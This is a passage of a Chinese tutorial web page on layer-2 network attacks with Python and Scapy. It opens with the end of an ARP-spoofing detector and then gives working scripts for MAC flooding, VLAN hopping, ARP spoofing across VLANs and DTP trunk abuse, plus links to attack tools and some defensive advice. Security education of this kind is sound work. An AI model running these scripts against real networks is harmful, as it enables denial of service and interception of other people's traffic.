			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>&quot;Cannot read file &quot;</code> <code>+</code> <code>arp_watcher_db_file</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit(</code><code>1</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>for</code> <code>line </code><code>in</code> <code>fh:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>line.chomp()</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>(ip, mac) </code><code>=</code> <code>line.split(</code><code>&quot; &quot;</code><code>)</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ip_mac[ip] </code><code>=</code> <code>mac&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>sniff(prn</code><code>=</code><code>watch_arp,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>filter</code><code>=</code><code>&quot;arp&quot;</code><code>,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>],</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>store</code><code>=</code><code>0</code><code>)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>开始我们定义了一个信号处理函数<code>sig_int_handler()</code>，当用户中断程序时该函数会被调用。该函数会在<code>ip_mac</code>字典中，将所有已知的<code>IP</code>和<code>MAC</code>地址对应关系保存到一个文件当中。一开始我们读取这些<code>ARP db</code>文件，用目前已知的所有对应关系来初始化程序，若文件无法读取则退出。然后我们将文件内容一行一行地循环读取，把每一行分割为<code>IP</code>和<code>MAC</code>地址，将它们保存到 <code>ip_mac</code>字典中。我们再调用已知的<code>sniff()</code>函数，对每一个接收到的<code>ARP</code>数据包，调用回调函数<code>watch_arp</code>。</p>

<p><code>watch_arp</code>函数是整个程序中的核心逻辑部分。当嗅探到的数据包是<code>is-at</code>数据包时，则该数据包为一个<code>ARP</code>响应。紧接着我们首先检查IP是否存在于<code>ip_mac</code>字典中。如果我们没有发现对应条目，则其为一个新设备，并在屏幕上显示一条信息。否则我们将数据包中的<code>MAC</code>地址与字典中的<code>MAC</code>相比较，如果不同则响应很可是伪造的，我们也在屏幕上显示一条消息。在这两种情况下，都会用新的信息来更新字典。</p>

<h1>0x04 MAC-Flooder</h1>

<hr />
<p>交换机和其他计算机一样，具有有限的内存，交换机中存放<code>MAC</code>地址信息的表格也同样如此，该表格记录哪个<code>MAC</code>地址对应哪个端口及其内部的<code>ARP</code>缓 存。当交换机的缓冲区溢出时，它们的反应就会有些古怪。这将会导致交换机拒绝服务，以至于放弃交换行为而变得像正常的集线器。在集线器模式下，整体的高流 量不会是你遇到的唯一问题，因此在没有附加操作下，所有已连接的计算机都会接收到完整的流量。你应该测试一下的你的交换机在这种意外情况下是如何反应的， 接下来的脚本就可以做到这一点。它会产生随机的<code>MAC</code>地址，并将它们发送到你的交换机中，直到交换机的缓冲区被填满。</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>

			<p>12</p>

			<p>13</p>

			<p>14</p>

			<p>15</p>

			<p>16</p>

			<p>17</p>

			<p>18</p>

			<p>19</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>import</code> <code>sys</code></p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>packet </code><code>=</code> <code>Ether(src</code><code>=</code><code>RandMAC(</code><code>&quot;*:*:*:*:*:*&quot;</code><code>),</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dst</code><code>=</code><code>RandMAC(</code><code>&quot;*:*:*:*:*:*&quot;</code><code>)) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>IP(src</code><code>=</code><code>RandIP(</code><code>&quot;*.*.*.*&quot;</code><code>),</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dst</code><code>=</code><code>RandIP(</code><code>&quot;*.*.*.*&quot;</code><code>)) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ICMP()&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dev </code><code>=</code> <code>&quot;eth0&quot;</code></p>

			<p><code>else</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>dev </code><code>=</code> <code>sys.argv[</code><code>1</code><code>]&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>print</code> <code>&quot;Flooding net with random packets on dev &quot;</code> <code>+</code> <code>dev&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>sendp(packet, iface</code><code>=</code><code>dev, loop</code><code>=</code><code>1</code><code>)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p><code>RandMAC</code>和<code>RandIP</code>负责随机地产生地址当中的每一个字节。其余的则由<code>sendp()</code>函数的循环参数完成。</p>

<h1>0x05 VLAN Hopping</h1>

<hr />
<p>因为<code>VLAN</code>不具备安全特性，一方面标记<code>VLAN</code>取决于包含<code>VLAN id</code>的数据包头部，使用<code>Scapy</code>可以很容易创建这样的数据包。现在让我们的电脑连接到<code>VLAN1</code>，并且尝试去<code>ping VLAN2</code>上的其他主机。</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>packet </code><code>=</code> <code>Ether(dst</code><code>=</code><code>&quot;c0:d3:de:ad:be:ef&quot;</code><code>) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>1</code><code>) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>2</code><code>) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>IP(dst</code><code>=</code><code>&quot;192.168.13.3&quot;</code><code>) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ICMP()&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>sendp(packet)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>首先我们设定在数据包的头部当中，包含我们的<code>VLAN</code>标记，再加上一个目的主机地址。交换机将会移除第一个标记，并不决定如何处理该数据包，当它看到第二个标记<code>VLAN id 2</code> 的时候，则决定转发到这个<code>vlan</code>。如果交换机连接到其他通过堆叠启用的<code>VLAN</code>交换机，这种攻击只会是成功的，否则它们就是使用的基于端口的<code>VLAN</code>。</p>

<h1>0x06 Let&rsquo;s Play Switch</h1>

<hr />
<p><code>Linux</code>可以运行在许多嵌入式网络设备上；因此凭借<code>Linux</code>操作系统，人们可以把自己的电脑变成一台功能齐全的<code>VALN</code>交换机，这并不令人惊奇。你只需要<code>vconfig</code>这种工具就够了。在根据你的操作系统安装所需的数据包后，通过以下的命令，你可以将你的主机加入到另一个<code>VLAN</code>环境中。</p>

<pre>
vconfig add eth0 1
</pre>

<p>然后你必须记住启动新设备，并给它一个<code>VLAN</code>网络中的<code>IP</code>地址。</p>

<pre>
ifconfig eth0.1 192.168.13.23 up
</pre>

<h1>0x07 ARP Spoofing Over VLAN Hopping</h1>

<hr />
<p><code>VLAN</code>会限制对同一<code>VLAN</code>的端口的广播流量，因此我们不能在默认情况下应对所有的<code>ARP</code>请求，就像在第一个<code>ARP spoofing</code>例子中看到的那样，必须每隔几秒就向受害者告诉我们的<code>MAC</code>地址。除了我们对每个数据包进行了标记和加之的目的<code>VLAN</code>，下面的代码是通用的。</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>

			<p>12</p>

			<p>13</p>

			<p>14</p>

			<p>15</p>

			<p>16</p>

			<p>17</p>

			<p>18</p>

			<p>19</p>

			<p>20</p>

			<p>21</p>

			<p>22</p>

			<p>23</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>import</code> <code>time</code></p>

			<p><code>from</code> <code>scapy.</code><code>all</code> <code>import</code> <code>sendp, ARP, Ether, Dot1Q&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>iface </code><code>=</code> <code>&quot;eth0&quot;</code></p>

			<p><code>target_ip </code><code>=</code> <code>&#39;192.168.13.23&#39;</code></p>

			<p><code>fake_ip </code><code>=</code> <code>&#39;192.168.13.5&#39;</code></p>

			<p><code>fake_mac </code><code>=</code> <code>&#39;c0:d3:de:ad:be:ef&#39;</code></p>

			<p><code>our_vlan </code><code>=</code> <code>1</code></p>

			<p><code>target_vlan </code><code>=</code> <code>2</code>&nbsp;&nbsp;&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>packet </code><code>=</code> <code>Ether() </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>our_vlan) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>Dot1Q(vlan</code><code>=</code><code>target_vlan) </code><code>/</code> <code>\</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>ARP(hwsrc</code><code>=</code><code>fake_mac,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>pdst</code><code>=</code><code>target_ip,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>psrc</code><code>=</code><code>fake_ip,</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>op</code><code>=</code><code>&quot;is-at&quot;</code><code>)&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>while</code> <code>True</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sendp(packet, iface</code><code>=</code><code>iface)</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>time.sleep(</code><code>10</code><code>)</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>幸运的是，防御这种类型的<code>VLAN</code>攻击并没有那么复杂：如果你真的想分离你的网络，只需要使用物理划分的交换机！</p>

<h1>0x08 DTP Abusing</h1>

<hr />
<p><code>DTP</code>（动态中继协议）是一种由思科发明的专有协议，用于如果一个端口是<code>trunk</code>端口，则交换机之间可以动态地交流。<code>Trunk</code>端口通常用于互连交换机和路由器，以便共享一些或所有已知的<code>VLAN</code>。</p>

<p>为了能够执行下面的代码，你需要安装<code>Scapy</code>的开发版本。同时为了<code>check out</code>出源，请先安装<code>Mercurial</code>，然后键入以下命令来克隆<code>Scapy repository</code>。</p>

<pre>
hg clone http://hg.secdev.org/scapy scapy
</pre>

<p>如果你想跟踪<code>Scapy</code>的最新版本，你只需要时不时地更新<code>checkout</code>。</p>

<pre>
cd scapy
hg pull
</pre>

<p>现在你可以将旧版本的<code>Scapy</code>变成最新版的了。</p>

<pre>
pip uninstall Scapy
cd scapy
python setup.py install
</pre>

<p>多亏了<code>DTP</code>协议，和它完全忽视任何一种安全的属性，我们现在就可以发送一个动态可取包到每一个启用DTP的思科设备，并要求它将我们的端口转变为<code>trunk</code>端口。</p>

<table border="0" cellpadding="0" cellspacing="0">
	<tbody>
		<tr>
			<td>
			<p>1</p>

			<p>2</p>

			<p>3</p>

			<p>4</p>

			<p>5</p>

			<p>6</p>

			<p>7</p>

			<p>8</p>

			<p>9</p>

			<p>10</p>

			<p>11</p>
			</td>
			<td>
			<p><code>#!/usr/bin/python&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>import</code> <code>sys</code></p>

			<p><code>from</code> <code>scapy.layers.l2 </code><code>import</code> <code>Dot3 , LLC, SNAP</code></p>

			<p><code>from</code> <code>scapy.contrib.dtp </code><code>import</code> <code>*</code>&nbsp;&nbsp;&nbsp;</p>

			<p>&nbsp;</p>

			<p><code>if</code> <code>len</code><code>(sys.argv) &lt; </code><code>2</code><code>:</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>print</code> <code>sys.argv[</code><code>0</code><code>] </code><code>+</code> <code>&quot; &lt;dev&gt;&quot;</code></p>

			<p><code>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code>sys.exit()&nbsp;&nbsp;&nbsp; </code></p>

			<p>&nbsp;</p>

			<p><code>negotiate_trunk(iface</code><code>=</code><code>sys.argv[</code><code>1</code><code>])</code></p>
			</td>
		</tr>
	</tbody>
</table>

<p>作为一个可选参数，你可以设置欺骗相邻交换机的<code>MAC</code>地址，如果没有设置，则会自动生成一个随机值。</p>

<p>这种攻击可能会持续几分钟，但是攻击者并不关心延迟，因为他们知道在改变连接到每一个<code>VLAN</code>的可能性之后他们会得到什么！</p>

<pre>
vconfig add eth0 &lt;vlan-id&gt;
ifconfig eth0.&lt;vlan-id&gt; &lt;ip_of_vlan&gt; up
</pre>

<p>没有足够好的理由来使用<code>DTP</code>，所以干脆禁用掉它吧！</p>

<h1>0x09 Tools</h1>

<hr />
<ol>
	<li>
	<p><strong>NetCommander</strong></p>

	<p><code>NetCommander</code>是一个简单的<code>ARP</code>欺骗程序。它通过对每一个可能的<code>IP</code>发送<code>ARP</code>请求，来搜索网络上存活的主机。你可以选择需要劫持的连接，然后每隔几秒，<code>NetCommander</code>就会自动地欺骗那些主机和默认网关之间的双向连接。</p>

	<p>工具的源代码可以从这里下载：<a href="https://github.com/evilsocket/NetCommander">https://github.com/evilsocket/NetCommander</a></p>
	</li>
	<li>
	<p><strong>Hacker&rsquo;s Hideaway ARP Attack Tool</strong></p>

	<p><code>Hacker&rsquo;s Hideaway ARP Attack Tool</code>比<code>NetCommander</code>的功能多一些。除了欺骗特殊连接，它还支持被动欺骗所有对源<code>IP</code>的<code>ARP</code>请求，和<code>MAC</code>泛洪攻击。</p>

	<p>工具的下载链接为：<a href="https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2">https://packetstormsecurity.org/files/81368/hharp.py.tar.bz2</a></p>
	</li>
	<li>
	<p><strong>Loki</strong></p>

	<p><code>Loki</code>是一种像<code>Yersinia</code>的第二层和第三层攻击工具。它可以通过插件来扩展，也有一个漂亮的<code>GUI</code>界面。它实现了像<code>ARP</code>欺骗和泛洪，<code>BGP</code>，<code>RIP</code>路由注入之类的攻击，甚至可以攻击像HSRP和VRRP那样非常罕见的协议。</p>

	<p>工具的源代码地址为：<a href="https://www.c0decafe.de/loki.html">https://www.c0decafe.de/loki.html</a></p>
	</li>
</ol>

<p>&nbsp;</p>
</div>
	<div class="tag">TAG标签:python</div>
	<div class="comment">
		<h2><a href="comment.php?action=show&cid=16" target="_blank">已有<span><script type="text/javascript">getCommentCount();</script></span>人参与评论</a>最新评论</h2>
	<form method="post" action="comment.php?cid=16&action=comment" name="comment">
		<p class="attitude">你对本文的看法:<input type="radio" name="manner" value="1" />支持
						 <input type="radio" name="manner" value="0" />中立
						 <input type="radio" name="manner" value="-1" />反对
		</p>
		<p><textarea name="content"></textarea></p>
		<p>验证码：<input type="text" name="checkcode" class="code" /><img class="imgcode" src="config/code.php" onclick="javascript:this.src='../config/code.php?tm='+Math.random();"/></p>
		<p class="red">请遵守互联网法规，对自己的言论负责</p>
		<br/>
		<p><input type="submit" value="提交评论" name="send" onclick="return checkComment();" /></p>
	</form>
	</div>
</div>
<div id="sidebar">
	<div class="nav">
    	<h2>子栏目列表</h2>
    	    	<span>该栏目没有子类</span>
    	    </div>
    <div class="right">
	<h2>本类推荐</h2>
    	<ul class="list-info">
    		<li><span>06-12</span><a href="#">习近平签署第四十三号主席令</a></li>
    		<li><span>04-30</span><a href="#">李克强答问结束 记者:加油</a></li>
    		<li><span>07-22</span><a href="#">印尼警方击毙两名中国籍武装分子</a></li>
    		<li><span>02-11</span><a href="#">广东落马领导庭审自辩:女儿收钱坑爹</a></li>
    		<li><span>03-07</span><a href="#">李肇星在印度出席会议因"台独"问题离席</a></li>
    		<li><span>03-12</span><a href="#">目击者回应"女子被骂中国猪"</a></li>
    		<li><span>01-01</span><a href="#">上海两千人为阿迪达斯新鞋连夜排队</a></li>
    	</ul>
	</div>
	<div class="right">
	<h2>本类热点</h2>
    	<ul class="list-info">
    		<li><span>06-12</span><a href="#">习近平签署第四十三号主席令</a></li>
    		<li><span>04-30</span><a href="#">李克强答问结束 记者:加油</a></li>
    		<li><span>07-22</span><a href="#">印尼警方击毙两名中国籍武装分子</a></li>
    		<li><span>02-11</span><a href="#">广东落马领导庭审自辩:女儿收钱坑爹</a></li>
    		<li><span>03-07</span><a href="#">李肇星在印度出席会议因"台独"问题离席</a></li>
    		<li><span>03-12</span><a href="#">目击者回应"女子被骂中国猪"</a></li>
    		<li><span>01-01</span><a href="#">上海两千人为阿迪达斯新鞋连夜排队</a></li>
    	</ul>
	</div>
	<div class="right">
	<h2>本类图文</h2>
    	<ul class="list-info">
    		<li><span>06-12</span><a href="#">习近平签署第四十三号主席令</a></li>
    		<li><span>04-30</span><a href="#">李克强答问结束 记者:加油</a></li>
    		<li><span>07-22</span><a href="#">印尼警方击毙两名中国籍武装分子</a></li>
    		<li><span>02-11</span><a href="#">广东落马领导庭审自辩:女儿收钱坑爹</a></li>
    		<li><span>03-07</span><a href="#">李肇星在印度出席会议因"台独"问题离席</a></li>
    		<li><span>03-12</span><a href="#">目击者回应"女子被骂中国猪"</a></li>
    		<li><span>01-01</span><a href="#">上海两千人为阿迪达斯新鞋连夜排队</a></li>
    	</ul>
	</div>

</div>

<div id="link">
	<h2><span><a href="#">所有链接</a> | <a href="#">申请加入</a></span>友情链接</h2>
	<ul>
		<li><a href="#">网易新闻</a></li>
		<li><a href="#">腾讯新闻</a></li>
		<li><a href="#">百度搜索</a></li>
		<li><a href="#">谷歌搜索</a></li>
		<li><a href="#">360新闻</a></li>
		<li><a href="#">乌云安全网</a></li>
		<li><a href="#">开源中国</a></li>
		<li><a href="#">阿里云</a></li>
		<li><a href="#">淘宝</a></li>
		<li><a href="#">中关村在线</a></li>
		<li><a href="#">凤凰网</a></li>
	</ul>
	<dl>
		<dd><a href="#" target="_blank"><img src="images/youku.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/163.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/baidu.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/qqcar.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/damai.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/yiche.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/alibaba.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/sina.png" alt="webname"></img></a></dd>
		<dd><a href="#" target="_blank"><img src="images/youku.png" alt="webname"></img></a></dd>
	</dl>
</div>

<div id="footer">
	<p>Powered by <span>HejunweiCoder</span> (C) 2016-2017 DesDev Inc.</p>
	<p>Copyright (C) 2016-2017 <span>CMS.HejunweiCoder</span> 版权所有</p>
</div>




</body>
</html>



